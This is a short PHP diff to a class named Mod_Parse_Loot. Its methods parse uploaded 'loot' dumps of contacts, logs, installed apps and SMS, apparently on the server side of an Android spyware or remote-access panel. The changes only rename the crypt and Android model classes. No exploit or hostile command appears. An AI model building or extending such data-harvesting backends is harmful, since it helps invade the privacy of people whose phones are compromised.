@@ -17,7 +17,7 @@ class Mod_Parse_Loot extends Model
     public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print): bool
     {
         try {
-            $cryptModel = new CryptModel();
+            $cryptModel = new Mod_Crypt();
             $androidModel = new AndroidModel();
             $dated = date('Y-m-d H:i:s');
 
@@ -86,8 +86,8 @@ class Mod_Parse_Loot extends Model
     public function get_logs(string $file_name, int $var_file_owner, string $var_file_print): bool
     {
         try {
-            $cryptModel = new CryptModel();
-            $androidModel = new AndroidModel();
+            $cryptModel = new Mod_Crypt() ;
+            $androidModel = new Mod_Android();
             $dated = date('Y-m-d H:i:s');
 
             $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
@@ -157,7 +157,7 @@ class Mod_Parse_Loot extends Model
     public function get_apps(string $file_name, int $var_file_owner, string $var_file_print): bool
     {
         try {
-            $cryptModel = new CryptModel();
+            $cryptModel = new Mod_Crypt();
             $dated = date('Y-m-d H:i:s');
 
             $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
@@ -221,7 +221,7 @@ class Mod_Parse_Loot extends Model
     public function get_sms(string $file_name, int $var_file_owner, string $var_file_print): bool
     {
         try {
-            $cryptModel = new CryptModel();
+            $cryptModel = new Mod_Crypt();
             $androidModel = new AndroidModel();
             $dated = date('Y-m-d H:i:s');
 
